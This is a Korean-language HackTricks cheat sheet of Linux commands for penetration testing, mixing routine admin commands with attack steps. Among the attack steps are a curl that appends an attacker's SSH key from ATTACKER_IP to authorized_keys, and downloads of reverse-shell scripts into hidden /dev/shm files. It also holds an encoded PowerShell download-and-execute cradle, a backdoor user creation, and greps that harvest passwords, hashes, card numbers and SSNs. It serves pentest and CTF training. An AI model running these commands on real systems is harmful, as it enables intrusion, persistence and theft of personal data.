# 유용한 Linux 명령어

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**할 수 있습니다.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 일반적인 Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)을 사용하여 세계에서 가장 **고급**한 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 자동화하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Windows용 Bash
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

### grep

`grep`은 파일 내에서 특정 패턴을 검색하는 데 사용되는 명령어입니다. 기본적으로 `grep`은 대소문자를 구분하며, 정규 표현식을 사용하여 패턴을 지정할 수 있습니다.

```bash
grep pattern file
```

- `pattern`: 검색할 패턴입니다.
- `file`: 검색할 파일입니다.

### grep -i

`grep -i`는 대소문자를 구분하지 않고 검색하는 옵션입니다.

```bash
grep -i pattern file
```

### grep -r

`grep -r`은 디렉토리 내의 모든 파일에서 패턴을 검색하는 옵션입니다.

```bash
grep -r pattern directory
```

- `pattern`: 검색할 패턴입니다.
- `directory`: 검색할 디렉토리입니다.

### grep -v

`grep -v`는 패턴과 일치하지 않는 라인을 출력하는 옵션입니다.

```bash
grep -v pattern file
```

### grep -n

`grep -n`은 검색된 라인의 줄 번호를 함께 출력하는 옵션입니다.

```bash
grep -n pattern file
```

### grep -l

`grep -l`은 패턴과 일치하는 파일의 이름만 출력하는 옵션입니다.

```bash
grep -l pattern file
```

### grep -c

`grep -c`는 패턴과 일치하는 라인의 개수를 출력하는 옵션입니다.

```bash
grep -c pattern file
```

### grep -A

`grep -A`는 패턴과 일치하는 라인 이후의 몇 줄을 출력하는 옵션입니다.

```bash
grep -A num pattern file
```

- `num`: 출력할 라인의 개수입니다.

### grep -B

`grep -B`는 패턴과 일치하는 라인 이전의 몇 줄을 출력하는 옵션입니다.

```bash
grep -B num pattern file
```

- `num`: 출력할 라인의 개수입니다.

### grep -C

`grep -C`는 패턴과 일치하는 라인 주변의 몇 줄을 출력하는 옵션입니다.

```bash
grep -C num pattern file
```

- `num`: 출력할 라인의 개수입니다.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## 찾기

The `find` command is used to search for files and directories in a specified location. It allows you to search based on various criteria such as file name, size, type, and modification time.

### Basic Usage

The basic syntax of the `find` command is as follows:

```
find [path] [expression]
```

- `[path]`: Specifies the directory or path where the search should be performed. If no path is specified, the current directory is used.
- `[expression]`: Specifies the search criteria or conditions.

### Examples

1. Search for a file by name:

   ```
   find /path/to/directory -name "filename"
   ```

   This command will search for a file named "filename" in the specified directory.

2. Search for files by extension:

   ```
   find /path/to/directory -name "*.txt"
   ```

   This command will search for all files with the ".txt" extension in the specified directory.

3. Search for files by size:

   ```
   find /path/to/directory -size +1M
   ```

   This command will search for files larger than 1 megabyte in the specified directory.

4. Search for files by modification time:

   ```
   find /path/to/directory -mtime -7
   ```

   This command will search for files modified within the last 7 days in the specified directory.

5. Search for directories:

   ```
   find /path/to/directory -type d
   ```

   This command will search for directories in the specified directory.

### Conclusion

The `find` command is a powerful tool for searching files and directories in Linux. By using different search criteria, you can easily locate the desired files or directories.
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap 검색 도움말

Nmap은 네트워크 탐사 및 보안 감사 도구로 널리 사용됩니다. Nmap을 사용하여 네트워크에서 호스트 및 서비스를 검색할 수 있습니다. 다음은 Nmap을 사용하는 몇 가지 유용한 명령어입니다.

### 기본 사용법

- `nmap <target>`: 특정 대상에 대한 기본 Nmap 스캔을 실행합니다.
- `nmap -p <port> <target>`: 특정 포트에 대한 Nmap 스캔을 실행합니다.
- `nmap -p- <target>`: 모든 포트에 대한 Nmap 스캔을 실행합니다.
- `nmap -sV <target>`: 서비스 및 버전 정보를 포함하여 Nmap 스캔을 실행합니다.
- `nmap -A <target>`: OS 탐지, 서비스 및 버전 정보, 스크립트 스캔 등을 포함하여 Nmap 스캔을 실행합니다.

### 스캔 옵션

- `-p <port>`: 특정 포트를 스캔합니다.
- `-p-`: 모든 포트를 스캔합니다.
- `-sS`: TCP SYN 스캔을 사용하여 포트를 스캔합니다.
- `-sU`: UDP 스캔을 사용하여 포트를 스캔합니다.
- `-sV`: 서비스 및 버전 정보를 포함하여 스캔합니다.
- `-O`: 호스트의 운영 체제를 탐지합니다.
- `-A`: OS 탐지, 서비스 및 버전 정보, 스크립트 스캔 등을 포함하여 스캔합니다.

### 결과 해석

- `open`: 포트가 열려 있음을 나타냅니다.
- `closed`: 포트가 닫혀 있음을 나타냅니다.
- `filtered`: 포트가 필터링되어 있음을 나타냅니다.
- `unfiltered`: 포트가 필터링되지 않음을 나타냅니다.
- `open|filtered`: 포트가 열려 있거나 필터링되어 있음을 나타냅니다.
- `closed|filtered`: 포트가 닫혀 있거나 필터링되어 있음을 나타냅니다.

Nmap은 다양한 옵션과 기능을 제공하므로 자세한 내용은 Nmap 문서를 참조하십시오.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash는 리눅스와 유닉스 시스템에서 가장 일반적으로 사용되는 셸입니다. 이 셸은 명령어를 실행하고 스크립트를 작성하는 데 사용됩니다. 다음은 Bash 셸에서 유용한 몇 가지 명령어입니다.

### 파일 및 디렉토리 작업

- `ls`: 현재 디렉토리의 파일 및 디렉토리 목록을 표시합니다.
- `cd`: 디렉토리를 변경합니다.
- `pwd`: 현재 작업 중인 디렉토리의 경로를 표시합니다.
- `mkdir`: 새로운 디렉토리를 생성합니다.
- `rm`: 파일 또는 디렉토리를 삭제합니다.
- `cp`: 파일 또는 디렉토리를 복사합니다.
- `mv`: 파일 또는 디렉토리를 이동하거나 이름을 변경합니다.

### 파일 내용 보기

- `cat`: 파일의 내용을 표시합니다.
- `less`: 파일의 내용을 페이지 단위로 표시합니다.
- `head`: 파일의 처음 몇 줄을 표시합니다.
- `tail`: 파일의 마지막 몇 줄을 표시합니다.
- `grep`: 파일에서 특정 패턴을 검색합니다.

### 프로세스 관리

- `ps`: 현재 실행 중인 프로세스 목록을 표시합니다.
- `top`: 시스템의 현재 상태와 실행 중인 프로세스를 실시간으로 모니터링합니다.
- `kill`: 프로세스를 종료합니다.

### 사용자 및 권한 관리

- `whoami`: 현재 사용자의 이름을 표시합니다.
- `sudo`: 슈퍼 유저 권한으로 명령어를 실행합니다.
- `chmod`: 파일 또는 디렉토리의 권한을 변경합니다.
- `chown`: 파일 또는 디렉토리의 소유자를 변경합니다.

### 네트워크 관련

- `ping`: 호스트에 ICMP 패킷을 보내 응답을 확인합니다.
- `ifconfig`: 네트워크 인터페이스의 정보를 표시합니다.
- `netstat`: 네트워크 연결 및 라우팅 테이블 정보를 표시합니다.

이 명령어들은 Bash 셸에서 자주 사용되는 몇 가지 예시입니다. Bash에는 더 많은 명령어와 옵션이 있으며, `man` 명령어를 사용하여 자세한 정보를 확인할 수 있습니다.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables는 Linux 시스템에서 방화벽을 구성하고 관리하는 데 사용되는 강력한 도구입니다. 이 도구를 사용하여 네트워크 트래픽을 제어하고 보안을 강화할 수 있습니다.

### Iptables 기본 명령어

- `iptables -L`: 현재 설정된 모든 규칙을 나열합니다.
- `iptables -F`: 모든 규칙을 삭제합니다.
- `iptables -P <chain> <policy>`: 특정 체인의 기본 정책을 설정합니다.
- `iptables -A <chain> <rule>`: 특정 체인에 규칙을 추가합니다.
- `iptables -D <chain> <rule>`: 특정 체인에서 규칙을 삭제합니다.

### Iptables 규칙 작성

Iptables 규칙은 다음과 같은 구조를 가지고 있습니다:

```
iptables -A <chain> -p <protocol> --dport <port> -s <source> -d <destination> -j <action>
```

- `<chain>`: 규칙이 적용될 체인 (INPUT, OUTPUT, FORWARD)
- `<protocol>`: 트래픽에 적용될 프로토콜 (tcp, udp, icmp)
- `<port>`: 트래픽이 전달될 포트 번호
- `<source>`: 트래픽의 출발지 IP 주소 또는 네트워크
- `<destination>`: 트래픽의 목적지 IP 주소 또는 네트워크
- `<action>`: 규칙에 대한 액션 (ACCEPT, DROP, REJECT)

### Iptables 예제

다음은 Iptables를 사용하여 특정 포트에 대한 액세스를 제한하는 예제입니다:

```bash
iptables -A INPUT -p tcp --dport 22 -j DROP
```

위의 예제는 SSH 포트인 22번에 대한 액세스를 차단합니다.

```bash
iptables -A INPUT -p tcp --dport 80 -s 192.168.0.0/24 -j ACCEPT
```

위의 예제는 출발지 IP 주소가 192.168.0.0/24인 트래픽을 허용하는 동시에 포트 80으로 전달될 때만 허용합니다.

### Iptables 설정 저장

Iptables 설정을 영구적으로 유지하려면 설정을 저장해야 합니다. 이를 위해 다음 명령어를 사용할 수 있습니다:

- `iptables-save > /etc/iptables/rules.v4`: IPv4 규칙을 저장합니다.
- `iptables-save > /etc/iptables/rules.v6`: IPv6 규칙을 저장합니다.

이렇게 하면 시스템이 재부팅되어도 설정이 유지됩니다.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 고급스러운 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
